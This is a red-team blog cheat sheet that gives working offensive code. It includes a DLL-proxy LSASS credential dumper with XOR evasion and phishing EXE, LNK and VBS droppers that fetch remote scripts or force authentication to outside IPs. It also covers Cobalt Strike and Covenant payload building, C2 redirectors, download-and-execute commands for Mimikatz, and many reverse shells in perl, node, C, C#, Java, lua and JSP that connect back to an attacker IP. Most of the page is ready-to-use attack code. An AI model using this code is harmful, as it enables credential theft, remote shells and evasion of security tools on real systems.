---
title: "Red Team Tricks"
date: 2022-11-16T09:30:10+08:00
tags:
  - red team
  - ttp
---

- **[Lsass Dump](#lsass-dump)**
	- [NanoDump](#nanodump)
	- [Dll Proxying](#dll-proxying)
- **[Phishing](#phishing)**
	- [EXE](#exe)
	- [LNK](#lnk)
	- [VBS](#vbs)
- **[Bypassing MOTW](#bypassing-motw)**
	- [ZippyReads](#ZippyReads-(CVE-2022-41091))
- **[Bypassing Policy](#bypassing-policy)**
	- [Executing EXE with oleObject](#executing-exe-with-oleObject)
- **[Payload Creation](#payload-creation)**
	- [VBScript dropper](#vbscript-dropper)
- **[File Transfer](#file-transfer)**
- **[DLL Sideloading](#dll-sideloading)**
- **[Reverse Shells](#reverse-shells)**

# Lsass Dump
### NanoDump
A great tool that implements many techniques such as *duplicating, forking handles and etc.* However it is highly recommended to not use the default binaries (located in /dist) since it is highly likely to get nuked by AV/EDR. You can use various methods in order to bypass detection such as:
* Converting PE to shellcode with [donut](https://github.com/TheWover/donut)
* Embeding EXE in DInvoke ManualMapping using [Sharperner](https://github.com/aniqfakhrul/Sharperner)
* Use PEPacker to pack the PE file (i.e. [UPX](https://github.com/upx/upx) or [AtomPEPacker](https://github.com/ORCx41/AtomPePacker))
Below is an example that I usually use in my engagements.

1. Give arguments directly in the binary by hardcoding `argv` and `argc` into the source code itself. *(Write this in an entry function, usually its main())*
```cpp
# example for Nanodump binary
argv[1] = "--write";
argv[2] = "C:\\Windows\\Tasks\file.dmp";
argc = 3;
```
2. Compile the binary and embed with any of the methods mentioned above. In this case, I'll use [Sharperner](https://github.com/aniqfakhrul/Sharperner) `/compile` flag to embed PE file into SharpSploit's ManualMapping via DInvoke method. 
```
Sharperner.exe /compile:nanodump.exe
```
3. Note that this requires you to drop file on disk. Execute the binary and the dump file will be written in your desired path.

### DLL Proxying
Original writeup is posted [here](https://dec0ne.github.io/research/2022-11-14-Undetected-Lsass-Dump-Workflow/) by [dec0ne](https://twitter.com/dec0ne). Detailed step by step guide will be written later. Below is the source code for dll used. To summarize, this method will hijack dll called *Version.dll* that is mostly ran by a Microsoft-signed binaries (i.e. MS Teams). Hence it is highly likely to bypass EDR. This code will encode the dump output to avoid static detection on an lsass dump file. Use [this](https://gist.github.com/aniqfakhrul/af3a114ecac0e2d0ca35e807d795f5c3) to decode back to its original form.
```c
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#pragma comment(lib, "Dbghelp.lib")

#pragma comment(linker,"/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA,@1")
#pragma comment(linker,"/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.GetFileVersionInfoByHandle,@2")
#pragma comment(linker,"/export:GetFileVersionInfoExA=C:\\Windows\\System32\\version.GetFileVersionInfoExA,@3")
#pragma comment(linker,"/export:GetFileVersionInfoExW=C:\\Windows\\System32\\version.GetFileVersionInfoExW,@4")
#pragma comment(linker,"/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA,@5")
#pragma comment(linker,"/export:GetFileVersionInfoSizeExA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker,"/export:GetFileVersionInfoSizeExW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker,"/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeW,@8")
#pragma comment(linker,"/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW,@9")
#pragma comment(linker,"/export:VerFindFileA=C:\\Windows\\System32\\version.VerFindFileA,@10")
#pragma comment(linker,"/export:VerFindFileW=C:\\Windows\\System32\\version.VerFindFileW,@11")
#pragma comment(linker,"/export:VerInstallFileA=C:\\Windows\\System32\\version.VerInstallFileA,@12")
#pragma comment(linker,"/export:VerInstallFileW=C:\\Windows\\System32\\version.VerInstallFileW,@13")
#pragma comment(linker,"/export:VerLanguageNameA=C:\\Windows\\System32\\version.VerLanguageNameA,@14")
#pragma comment(linker,"/export:VerLanguageNameW=C:\\Windows\\System32\\version.VerLanguageNameW,@15")
#pragma comment(linker,"/export:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA,@16")
#pragma comment(linker,"/export:VerQueryValueW=C:\\Windows\\System32\\version.VerQueryValueW,@17")


// Global variables the will hold the dump data and its size
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200); // Allocate 200MB buffer on the heap
DWORD dumpSize = 0;

// Callback routine that we be called by the MiniDumpWriteDump function
BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
	LPVOID destination = 0;
	LPVOID source = 0;
	DWORD bufferSize = 0;
	switch (CallbackInput->CallbackType) {
	case IoStartCallback:
		CallbackOutput->Status = S_FALSE;
		printf("[+] Starting dump to memory buffer\n");
		break;
	case IoWriteAllCallback:
		// Buffer holding the current chunk of dump data
		source = CallbackInput->Io.Buffer;
		
		// Calculate the memory address we need to copy the chunk of dump data to based on the current dump data offset
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset);
		
		// Size of the current chunk of dump data
		bufferSize = CallbackInput->Io.BufferBytes;

		// Copy the chunk data to the appropriate memory address of our allocated buffer
		RtlCopyMemory(destination, source, bufferSize);
		dumpSize += bufferSize; // Incremeant the total size of the dump with the current chunk size
		
		//printf("[+] Copied %i bytes to memory buffer\n", bufferSize);
		
		CallbackOutput->Status = S_OK;
		break;
	case IoFinishCallback:
		CallbackOutput->Status = S_OK;
		printf("[+] Copied %i bytes to memory buffer\n", dumpSize);
		break;
	}
	return TRUE;
}

// Simple xor routine on memory buffer
void XOR(char* data, int data_len, char* key, int key_len)
{
	int j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1)
			j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

// Enable SeDebugPrivilige if not enabled already
BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf("[-] Could not get current process token with TOKEN_ADJUST_PRIVILEGES\n");
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	char sPriv[] = { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e',0 };
	if (!LookupPrivilegeValueA(NULL, (LPCSTR)sPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		printf("[-] No SeDebugPrivs. Make sure you are an admin\n");
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		printf("[-] Could not adjust to SeDebugPrivs\n");
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}

// Find PID of a process by name
int FindPID(const char* procname)
{
	int pid = 0;
	PROCESSENTRY32 proc = {};
	proc.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	bool bProc = Process32First(snapshot, &proc);

	while (bProc)
	{
		if (strcmp(procname, proc.szExeFile) == 0)
		{
			pid = proc.th32ProcessID;
			break;
		}
		bProc = Process32Next(snapshot, &proc);
	}
	return pid;
}

int main(int argc, char** argv) 
{
	// Find LSASS PID
	printf("[+] Searching for LSASS PID\n");
	int pid = FindPID("lsass.exe");
	if (pid == 0) {
		printf("[-] Could not find LSASS PID\n");
		return 0;
	}
	printf("[+] LSASS PID: %i\n", pid);
	
	// Make sure we have SeDebugPrivilege enabled
	if (!SetDebugPrivilege())
		return 0;

	// Open handle to LSASS
	HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
	if (hProc == NULL) {
		printf("[-] Could not open handle to LSASS process\n");
		return 0;
	}

	// Create a "MINIDUMP_CALLBACK_INFORMATION" structure that points to our DumpCallbackRoutine as a CallbackRoutine
	MINIDUMP_CALLBACK_INFORMATION CallbackInfo = { 0 };
	CallbackInfo.CallbackRoutine = DumpCallbackRoutine;

	// Do full memory dump of lsass and use our CallbackRoutine to handle the dump data instead of writing it directly to disk
	BOOL success = MiniDumpWriteDump(hProc, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
	if (success) {
		printf("[+] Successfully dumped LSASS to memory!\n");
	} else {
		printf("[-] Could not dump LSASS to memory\n[-] Error Code: %i\n", GetLastError());
		return 0;
	}

	// Xor encrypt our dump data in memory using the specified key
	char key[] = "jisjidpa123";
	printf("[+] Xor encrypting the memory buffer containing the dump data\n[+] Xor key: %s\n", key);
	XOR((char*)dumpBuffer, dumpSize, key, sizeof(key));

	// Create file to hold the encrypted dump data
	HANDLE hFile = CreateFile("LSASS_ENCRYPTED.DMP", GENERIC_ALL, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	
	// Write the encrypted dump data to our file
	DWORD bytesWritten = 0;
	WriteFile(hFile, dumpBuffer, dumpSize, &bytesWritten, NULL);
	printf("[+] Enrypted dump data written to \"LSASS_ENCRYPTED.DMP\" file\n");
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
		MessageBox(NULL, "Running LsassDumper.dll", "LsassDumper.dll", MB_OK);
		main(0, {});
	}
	return TRUE;
}
```

# Phishing

### EXE
```c
void execCommand(char *cmd){
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_MINIMIZE;
    si.dwFlags |= STARTF_USESTDHANDLES;
    
    BOOL success = CreateProcessA(NULL, (TCHAR*)cmd, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    WaitForSingleObject(pi.hProcess, 20000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main(void)
{
    char *cmd = "rundll32.exe printui.dll,PrintUIEntry /p /n\\\\103.186.117.152\\printer";
    execCommand(cmd);
}
```

### LNK
```powershell
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut("C:\Users\REUSER\Desktop\firefoxx.lnk")
$shortcut.TargetPath = "powershell.exe"
$shortcut.Description = "Totally Notmal"
$shortcut.HotKey = "F6"
$shortcut.IconLocation = "C:\Program Files\Mozilla Firefox\firefox.exe"
$shortcut.Arguments = "-windowstyle hidden iex(iwr -usebasicparsing http://example.com/notmal.ps1)"
$shortcut.save()
```

### VBS
```vb
REM@usage
' Put the full or mini class/sub/function in your script to use.
Function production(p):Dim w,e,r,o:Set w=CreateObject("WScript.Shell"):Set e=w.Exec("CmD"):e.StdIn.WriteLine p&" 2>&1":e.StdIn.Close:While(InStr(e.StdOut.ReadLine,">"&p)=0)::Wend:Do:o=e.StdOut.ReadLine:If(e.StdOut.AtEndOfStream)Then:Exit Do:Else:r=r&o&vbLf:End If:Loop:production=r:End Function

' returns the result of whatever command you run
production( "rundll32 printui.dll,PrintUIEntry /p /n\\192.168.86.201\printer" )
```

# Bypassing MOTW

### ZippyReads (CVE-2022-41091)
This is the technique discovered by [Will Dormann](https://twitter.com/wdormann). However, since this has been asssigned as a CVE, note that this have been patched in new windows releases. 
1. Set your payloads to *read-only* permission.
```
attrib +r file.exe
```
![](src/Pasted%20image%2020221116085831.png)
2. Zip the file with any zip utility that you prefer. In this case, i'll normally use native zip utility on windows to zip the file.

**References**
- https://twitter.com/wdormann/status/1590044005395357697?s=20&t=6DFV1gLeBZvd-grQawp87A

# Bypassing Policy

### Executing EXE with oleObject
1. Click on *Insert Object* and choose your binary under *Create from file* option.
![](src/Pasted%20image%2020221201224938.png)
2. Double clicking on the object will prompt this prompt. Click on Run and cmd should appears.
![](src/Pasted%20image%2020221201225040.png)

# Bypassing Policy

### Executing EXE with oleObject
1. Click on *Insert Object* and choose your binary under *Create from file* option.
![](src/Pasted%20image%2020221201224938.png)
2. Double clicking on the object will prompt this prompt. Click on Run and cmd should appears.
![](src/Pasted%20image%2020221201225040.png)
# Payload Creation

## VBScript dropper
Make sure to download [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript.git) and [Donut](https://github.com/TheWover/donut.git)._Note:This method probably won't 100% bypass EDR/AV._
### Cobalt Strike Beacon
For cobalt strike, this aggressor script called [**ShellCode Generator**](https://github.com/RCStep/CSSG) is very useful to generate shellcode with custom formatting. This cna also helps to obfuscate with XOR or AES method.

1. Generate shellcode and this is my default configuration
![SG](src/images/shellcode_generator.png)

2. Use [this](https://gist.githubusercontent.com/3xpl01tc0d3r/ecf5e1ac09935c674a9c6939c694da13/raw/238ed3339a458ce0260f98dc18a38fdbed420457/Payload.txt) script and paste those hex bytes in `shellcode` variable
![b64var](src/images/b64var.png)

3. Compile with **GadgetToJScript**

```
GadgetToJScript.exe -b -w vbs -o beacon -c .\real.cs
```

4. Execute with `wscript.exe beacon.cs`

### Covenant Grunt
For covenant, since its already has its built in .NET generator. You can use donut to further obfuscate the assembly/

1. Generate **binary** from Covenant
2. Obfuscate and convert to byte array with **Donut**. It will then generate into .bin file.
```
donut.exe -f .\Grunt.exe
```
3. Convert .bin file to base64 and save to clipboard
```powershell
# save filepath to a variable
$filename='<file-path-to>\payload.bin'
# Convert file to base64 and save to clipboard
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename) | Clip
```
4. Download [this](https://gist.githubusercontent.com/3xpl01tc0d3r/ecf5e1ac09935c674a9c6939c694da13/raw/238ed3339a458ce0260f98dc18a38fdbed420457/Payload.txt) script, save as payload.cs (or anythin bcs no one cares) and replace the `b64` variable with our current clipboard
5. Convert payload.cs to vbs with **GadgetToJScript**
```
.\GadgetToJScript.exe -b -w vbs -o realtest -c .\real.cs
```
6. Execute on remote computer
```
wscript.exe .\realtest.vbs
```

# C2 Redirector
Instead of directly interacting victims and C2 server. This is actually a neat trick to just use a redirector to be a middle man and route all the C2 traffic to your C2 server (in your local network)

### SSH Remote Tunnel
_Caveat: This method is not 100% reliable since it accepts all traffic coming through a single forwarded port. This will create more rubbish traffic comming into teamserver's IP_
1. Uncheck this line in `/etc/ssh/sshd_config` and restart ssh server
```ini
GatewayPorts clientspecified
```
2. Create reverse tunnel to the redirector. Be careful! this will open your local port (443) to to your VPS. _Note that on the left side is your redirector port and right side is your local C2 server port_
```bash
ssh -R 0.0.0.0:443:127.0.0.1:443 root@redirectorIP
```

### Apache mod_rewrite
This would require an Apache2 server setup on your redirector and C2 server also needed to have a public IP address.
1. Setup an Apache2 server on your redirector.
2. Modify your apache configuration file in `/etc/apache2/sites-enabled/000-default.conf`
```ini
ProxyRequests Off

# Target --> VPS --> C2
ProxyPass /index.html http//c2IPADRESS/index.html

# C2 --> VPS --> Target
ProxyPassReverse /index.html http//c2IPADRESS/index.html
```

# File Transfer

| **Command** | **Description** |
| --------------|-------------------|
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |

# DLL Sideloading
These are all some of my personal favorite sideloading tricks collected from various platforms. 

| Binary | Location | Reference DLL | Export Function | Reference |
|-------|---------|----------|-----|-----|
|NisSrv.exe|`C:\Program Files\Windows Defender\NisSrv.exe`|mpclient.dll|[Source](https://raw.githubusercontent.com/Sh0ckFR/Lockbit3.0-MpClient-Defender-PoC/main/dllmain-NisSrv.cpp)|[Link](https://twitter.com/Sh0ckFR/status/1554021948967079936)|
|MpCmdRun.exe|`C:\Program Files\Windows Defender\MpCmdRun.exe`|mpclient.dll|[Source](https://raw.githubusercontent.com/Sh0ckFR/Lockbit3.0-MpClient-Defender-PoC/main/dllmain-mpcmdrun.cpp)|[Link](https://twitter.com/Sh0ckFR/status/1554021948967079936)|

# Reverse Shells
_Credits: These reverse shells examples are reffered to [EzpzShell](https://github.com/H0j3n/EzpzShell) by [@h0j3n](https://twitter.com/h0j3n)_
### php reverse shell
You can get a full reverse shell script [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) by PentestMonkey
```php
<?php system("curl http://192.168.86.139/shell.php|php"); ?>
```

### perl reverse shell
```perl
# Example 1
perl -e 'use Socket;$i="192.168.86.139";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Example 2
use Socket

$i="192.168.86.139";
$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}
```

### nodejs reverse shell
```node
# Example 1
require('child_process').exec('nc -e /bin/sh 192.168.86.139 9001')

# Example 2
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(9001, "192.168.86.139", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

### c reverse shell
```c
######################### Example 1 #############################
## Compile : gcc -shared -o libchill.so -fPIC libchill.c

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
int greetings(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
}


######################### Example 2 #############################
## Compile : gcc shell.c -o shell

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 9001;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("192.168.86.139");

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
```

### c# reverse shell
This c-sharp reverse shell is from [PuckieStyle Blog](https://www.puckiestyle.nl/c-simple-reverse-shell/)._Note: Change `cmd.exe` to `bash` if you are using against linux environment_
```cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("10.0.2.15", 443))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### jenkins reverse shell
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.86.139/9001;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### lua reverse shell
```lua
# Example 1
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.86.139 9001 >/tmp/f")

# Example 2
lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.86.139 9001 >/tmp/f")'
```

### jsp reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.86.139 LPORT=9001 -f raw > shell.jsp
```